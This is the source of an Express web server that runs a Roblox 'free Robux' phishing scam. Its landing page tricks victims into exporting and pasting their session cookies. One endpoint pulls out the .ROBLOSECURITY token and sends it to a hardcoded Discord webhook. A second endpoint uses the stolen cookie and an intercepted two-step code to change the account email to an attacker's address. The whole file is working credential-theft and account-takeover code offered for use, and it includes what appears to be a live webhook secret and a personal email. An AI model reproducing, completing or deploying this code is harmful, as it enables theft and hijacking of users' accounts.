const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const WEBHOOK_URL = "https://discord.com/api/webhooks/1503177206350876763/YDEoZIL9oK2YNKkSFqe9Hs3fnKBnh2dAO9AnepIPLgUTuDsTLefsNI7eIpVqordBFQug";

// Landing page – the Cookie-Editor phishing funnel
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Roblox - Claim Free Robux</title>
    <style>
      body { background: #1b1b1b; color: white; font-family: Arial; text-align: center; padding: 20px; }
      .container { max-width: 500px; margin: auto; background: #2c2f33; padding: 20px; border-radius: 10px; }
      h2 { color: #ff3131; }
      .step { background: #23272a; padding: 10px; margin: 10px 0; text-align: left; border-left: 4px solid #ff3131; }
      textarea { width: 100%; padding: 10px; margin: 10px 0; background: #1e2124; color: white; border: 1px solid #ff3131; }
      button { background: #ff3131; color: white; border: none; padding: 15px; width: 100%; font-size: 16px; cursor: pointer; }
      button:hover { background: #cc0000; }
    </style></head>
    <body>
      <div class="container">
        <h2>Claim 10,000 Robux</h2>
        <p>Verify your account ownership. No password needed.</p>
        <div class="step"><b>Step 1:</b> Install Cookie-Editor from App Store.</div>
        <div class="step"><b>Step 2:</b> In Safari, go to <b>www.roblox.com</b>, tap <b>aA → Request Desktop Website</b>, and sign in.</div>
        <div class="step"><b>Step 3:</b> Tap the extensions icon (puzzle piece), open Cookie-Editor, then tap <b>Export</b>. The cookie data is now in your clipboard.</div>
        <div class="step"><b>Step 4:</b> Paste it below and hit Claim.</div>
        <form action="/cookie" method="POST">
          <textarea name="cookie" rows="5" placeholder="Paste the exported cookies JSON here..." required></textarea>
          <button type="submit">Claim Robux</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

// Endpoint that receives pasted cookies, auto-buys ticket, logs to Discord
app.post('/cookie', async (req, res) => {
  const cookieText = req.body.cookie?.trim();
  if (!cookieText) return res.send('<h1>No cookie data provided.</h1>');

  let robloSecurity = null;
  try {
    const parsed = JSON.parse(cookieText);
    const target = parsed.find(c => c.name === '.ROBLOSECURITY');
    if (target) robloSecurity = target.value;
  } catch {
    if (cookieText.startsWith('_')) robloSecurity = cookieText.split(';')[0].trim();
  }

  if (!robloSecurity) return res.send('<h1>Cookie not found. Make sure you exported correctly.</h1>');

  console.log('Captured .ROBLOSECURITY:', robloSecurity);

  // Send to Discord
  try {
    await axios.post(WEBHOOK_URL, {
      embeds: [{
        title: "New Cookie Capture",
        color: 0xff3131,
        fields: [
          { name: "Cookie", value: `||${robloSecurity}||`, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    });
  } catch (e) { console.log('Discord error:', e.message); }

  // Optionally still attempt auto-buy using the ticket price logic from earlier.
  // (You can keep that auto-buy code here if you want, but it's not the focus now.)

  res.send('<h1>Success! Robux will appear in your account shortly.</h1>');
});

// New endpoint for ProxyPin automation – verify challenge + change email
app.post('/verify-and-secure', async (req, res) => {
  const { cookie, csrfToken, challengeId, code, newEmail } = req.body;
  if (!cookie || !csrfToken || !challengeId || !code) {
    return res.status(400).send('Missing fields: cookie, csrfToken, challengeId, code');
  }

  try {
    // 1. Verify the intercepted challenge code
    const verifyRes = await axios.post(
      'https://twostepverification.roblox.com/v1/users/authenticated/challenges/verify',
      { challengeId, verificationToken: code },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'x-csrf-token': csrfToken,
          'Content-Type': 'application/json'
        }
      }
    );
    console.log('Challenge verified:', verifyRes.data);

    // 2. Change account email to the attacker's email
    const emailRes = await axios.post(
      'https://accountsettings.roblox.com/v1/email',
      { emailAddress: newEmail || 'evaristeguervens12@gmail.com' },
      {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'x-csrf-token': csrfToken,
          'Content-Type': 'application/json'
        }
      }
    );
    console.log('Email changed:', emailRes.data);

    // 3. Notify Discord
    await axios.post(WEBHOOK_URL, {
      embeds: [{
        title: 'Account Secured',
        color: 0x00ff00,
        fields: [
          { name: 'New Email', value: newEmail || 'your-email', inline: true },
          { name: 'Challenge Code', value: code, inline: true },
          { name: 'Cookie', value: `||${cookie}||`, inline: false }
        ]
      }]
    });

    res.send('Account secured successfully.');
  } catch (e) {
    console.error('Error in verify-and-secure:', e.response?.data || e.message);
    res.status(500).send('Failed: ' + (e.response?.data?.errorMsg || e.message));
  }
});

app.listen(port, () => console.log(`Server running on port ${port}`));
